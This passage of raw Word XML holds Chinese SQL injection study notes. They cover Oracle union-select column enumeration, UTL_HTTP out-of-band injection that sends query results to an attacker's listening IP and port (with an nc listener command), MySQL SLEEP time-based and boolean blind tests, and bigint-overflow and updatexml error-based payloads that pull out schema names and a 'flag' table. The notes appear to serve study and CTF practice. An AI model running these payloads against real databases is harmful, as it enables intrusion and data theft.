          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>' and rownum=1) from dual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获取其他字段名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>and 1=2 union select null,null,(select column_name from user_tab_columns where _name='</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>' and column_name&lt;&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>第一个字段</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>' and rownum=1) from dual</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A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获取字段内容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and 1=2 union select null,null,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字段名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="005C2440" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="005C2440">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>UTL_HTTP</w:t>
      </w:r>
      <w:r w:rsidRPr="005C2440">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>存储过程反弹注入攻击</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>若</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>union select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>联合查询被限制，可使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>utl_http.request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>包函数，取得远程</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>服务器的请求信息。攻击者自己监听端口，然后该函数将需要的数据发送反弹回来。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A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UTL_HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>存储过程是否可用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and exists(select count(*) from all_objects where object_name='UTL_HTTP')</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005C2440">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005C2440">
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>返回正常则说明</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>UTL_HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>可用</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A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监听本地端口</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>nc –vv –l –p 8888</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3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UTL_HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>反弹注入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and UTL_HTTP.request('http://IP:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>端口号</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>/'||(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>查询语句</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>))=1--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>and UTL_HTTP.request('http://182.168.0.189:8888/'||(select banner from sys.v_$version where rownum=1))=1--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A"/>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>盲注</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>盲注可以是基于时间，或是使用参数拆分平衡技术。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>不支持拆分字符串参数，只能拆分数字参数。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MsSQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>都支持。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>基于时间技术</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MySQL sleep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Payload: title=xiaoshiniudao&amp;order=id AND (SELECT * FROM (SELECT(SLEEP(5)))PisS)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MsSQL waitfor delay</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>关键字</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E46749" w:rsidRDefault="00E46749" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>基于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>bool</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>盲注</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E46749" w:rsidRDefault="00E46749" w:rsidP="00E46749">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">nd </w:t>
      </w:r>
      <w:r>
        <w:t>1=1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>正确</w:t>
      </w:r>
      <w:r>
        <w:t>显示说明没遇到过滤。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00E46749" w:rsidP="004D044E">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:t>And 1=2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>无法</w:t>
      </w:r>
      <w:r>
        <w:t>正确显示说明存在注入。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00372F6A" w:rsidRDefault="00EB0C04" w:rsidP="00372F6A">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>基于</w:t>
      </w:r>
      <w:r w:rsidR="00372F6A">
        <w:t>错误的注入</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00372F6A" w:rsidRDefault="00A21D25" w:rsidP="00372F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:t>基于错误的注入就是</w:t>
      </w:r>
      <w:r w:rsidRPr="00140BF6">
        <w:rPr>
          <w:strike/>
        </w:rPr>
        <w:t>根据页面报错内容</w:t>
      </w:r>
      <w:r w:rsidRPr="00140BF6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:strike/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00140BF6">
        <w:rPr>
          <w:strike/>
        </w:rPr>
        <w:t>进行注入</w:t>
      </w:r>
      <w:r w:rsidR="00140BF6">
        <w:t>将所需要的数据库数据显示在数据库的报错语句中</w:t>
      </w:r>
      <w:r w:rsidR="00140BF6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00140BF6">
        <w:t>因此该方法的前提是没有屏蔽报错信息</w:t>
      </w:r>
      <w:r w:rsidR="00140BF6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00140BF6">
        <w:t>一般用于屏蔽正确</w:t>
      </w:r>
      <w:r w:rsidR="00140BF6">
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidR="00140BF6">
        <w:t>执行结果</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004157B8" w:rsidRDefault="004157B8" w:rsidP="004157B8">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>其实</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中有很多种</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>error-based</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入，这里只列出了几种。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A64139" w:rsidRDefault="00C31FF2" w:rsidP="009E588F">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="62"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>有效的错误注入类型</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C31FF2" w:rsidRDefault="00DC0F40" w:rsidP="00401408">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:t>想要将目标数据在报错语句中显示</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:t>首先要构造合适的报错语句</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，能够显示可控的一段报错信息（一般的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:t>就无法控制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>），然后再目标数据嵌入到报错信息中。因此，一般基于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>error-based</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入需要完成两步（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>选择报错语句；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>插入目标数据</w:t>
      </w:r>
      <w:r w:rsidR="00FB0C49">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00741D68">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在报错信息中显示执行结果</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>）。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D94E25" w:rsidRDefault="00D94E25" w:rsidP="00401408">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:t>这里主要收集的是第一步中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>“合适”的报错语句。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00802955" w:rsidRDefault="00351730" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Big int value</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>溢出</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00351730" w:rsidRDefault="00F47AE9" w:rsidP="00457F05">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>(big)int</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>值溢出时会显示具体的溢出值，可以用来做</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>error-based</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F47AE9" w:rsidRDefault="00F47AE9" w:rsidP="00F47AE9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0">
                <wp:extent cx="5274310" cy="1404620"/>
                <wp:effectExtent l="0" t="0" r="21590" b="17780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>
                            <w:r>
                              <w:t xml:space="preserve">select </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00F47AE9">
                              <w:t>8446744073709551610</w:t>
                            </w:r>
                            <w:r>
                              <w:t>; -- mysql</w:t>
                            </w:r>
                            <w:r>
                              <w:t>正常执行</w:t>
                            </w:r>
                          </w:p>
                          <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA">
                            <w:r>
                              <w:t>select 2*</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00F47AE9">
                              <w:t>8446744073709551610</w:t>
                            </w:r>
                            <w:r>
                              <w:t xml:space="preserve">; </w:t>
                            </w:r>
                          </w:p>
                          <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA" w:rsidP="00AA6BA0">
                            <w:pPr>
                              <w:ind w:firstLine="420"/>
                            </w:pPr>
                            <w:r>
                              <w:t xml:space="preserve">-- </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>此时溢出</w:t>
                            </w:r>
                            <w:r>
                              <w:t>报错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 xml:space="preserve">BIGINT value is out of range in </w:t>
                            </w:r>
                            <w:r>
                              <w:t>‘(2*</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00F47AE9">
                              <w:t>8446744073709551610</w:t>
                            </w:r>
                            <w:r>
                              <w:t>)’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:rsidR="00812AAA" w:rsidRDefault="00812AAA" w:rsidP="00414F9E">
                            <w:r w:rsidRPr="00FB3B4F">
                              <w:t>SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a717071,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,451) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x7170626b71,0x78))s), 844674407370955161</w:t>
                            </w:r>
                            <w:r>
                              <w:t>0, 8446744073709551610)); -- demo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15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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA">
                      <w:r>
                        <w:t xml:space="preserve">select </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00F47AE9">
                        <w:t>8446744073709551610</w:t>
                      </w:r>
                      <w:r>
                        <w:t>; -- mysql</w:t>
                      </w:r>
                      <w:r>
                        <w:t>正常执行</w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA">
                      <w:r>
                        <w:t>select 2*</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00F47AE9">
                        <w:t>8446744073709551610</w:t>
                      </w:r>
                      <w:r>
                        <w:t xml:space="preserve">; </w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA" w:rsidP="00AA6BA0">
                      <w:pPr>
                        <w:ind w:firstLine="420"/>
                      </w:pPr>
                      <w:r>
                        <w:t xml:space="preserve">-- </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>此时溢出</w:t>
                      </w:r>
                      <w:r>
                        <w:t>报错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 xml:space="preserve">BIGINT value is out of range in </w:t>
                      </w:r>
                      <w:r>
                        <w:t>‘(2*</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00F47AE9">
                        <w:t>8446744073709551610</w:t>
                      </w:r>
                      <w:r>
                        <w:t>)’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:rsidR="00812AAA" w:rsidRDefault="00812AAA" w:rsidP="00414F9E">
                      <w:r w:rsidRPr="00FB3B4F">
                        <w:t>SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a717071,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,451) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x7170626b71,0x78))s), 844674407370955161</w:t>
                      </w:r>
                      <w:r>
                        <w:t>0, 8446744073709551610)); -- demo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82588" w:rsidRDefault="00CA0CA4" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>updatexml</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CA0CA4" w:rsidRPr="00351730" w:rsidRDefault="0034523C" w:rsidP="00F47AE9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0">
                <wp:extent cx="5274310" cy="1404620"/>
                <wp:effectExtent l="0" t="0" r="21590" b="17780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523C" w:rsidRDefault="0034523C">
                            <w:r>
                              <w:t>or updatexml(1,concat(0x7e,database())</w:t>
                            </w:r>
                            <w:r w:rsidR="009B3905">
                              <w:t>,0</w:t>
                            </w:r>
                            <w:r>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidR="00012075">
                              <w:t>%23</w:t>
                            </w:r>
                          </w:p>
                          <w:p w:rsidR="004B76BA" w:rsidRPr="004B76BA" w:rsidRDefault="004B76BA">
                            <w:r>
                              <w:t>or updatexml(1,concat(0x7e,(select flag from flag),0)%23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width:415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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w:rsidR="0034523C" w:rsidRDefault="0034523C">
                      <w:r>
                        <w:t>or updatexml(1,concat(0x7e,database())</w:t>
                      </w:r>
                      <w:r w:rsidR="009B3905">
                        <w:t>,0</w:t>
                      </w:r>
                      <w:r>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidR="00012075">
                        <w:t>%23</w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="004B76BA" w:rsidRPr="004B76BA" w:rsidRDefault="004B76BA">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:t>or updatexml(1,concat(0x7e,</w:t>
                      </w:r>
                      <w:r>
                        <w:t>(select flag from flag</w:t>
                      </w:r>
                      <w:bookmarkStart w:id="47" w:name="_GoBack"/>
                      <w:bookmarkEnd w:id="47"/>
                      <w:r>
                        <w:t>),0)%23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64139" w:rsidRDefault="00A64139" w:rsidP="00372F6A"/>
    <w:p w:rsidR="005071EC" w:rsidRPr="00E6652B" w:rsidRDefault="005071EC" w:rsidP="00372F6A">
      <w:pPr>
        <w:rPr>
          <w:strike/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00E6652B">
        <w:rPr>
          <w:strike/>
        </w:rPr>
        <w:t>根据报错分析可以明确区分出最主要的两类错误类型</w:t>
      </w:r>
      <w:r w:rsidRPr="00E6652B">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:strike/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005071EC" w:rsidRDefault="005071EC" w:rsidP="009E588F">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>字符型和数字型的基本原理</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005071EC" w:rsidRDefault="001A53B5" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字符型</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001A53B5" w:rsidRDefault="001A53B5" w:rsidP="001A53B5">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>例如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001A53B5" w:rsidRDefault="001A53B5" w:rsidP="001A53B5">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0">
                <wp:extent cx="5276850" cy="1404620"/>
                <wp:effectExtent l="0" t="0" r="19050" b="17780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SELECT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*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FROM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users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WHERE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id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=</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="string"/>
                                <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
                                <w:color w:val="E6DB74"/>
                                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="23241F"/>
                              </w:rPr>
                              <w:t>'$id'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LIMIT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,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415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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA"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SELECT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*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FROM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users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WHERE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id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=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="string"/>
                          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
                          <w:color w:val="E6DB74"/>
                          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="23241F"/>
                        </w:rPr>
                        <w:t>'$id'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LIMIT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0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,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1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236FC" w:rsidRDefault="00377B7F" w:rsidP="001A53B5">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:t>此时的报错会是</w:t>
      </w:r>
      <w:r w:rsidR="00C81A76">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D3129B">
        <w:t>‘’1’’ limit 0,1’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00377B7F" w:rsidRDefault="00377B7F" w:rsidP="001A53B5">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3A0774DD" wp14:editId="4B1B17A1">
                <wp:extent cx="5274310" cy="496331"/>
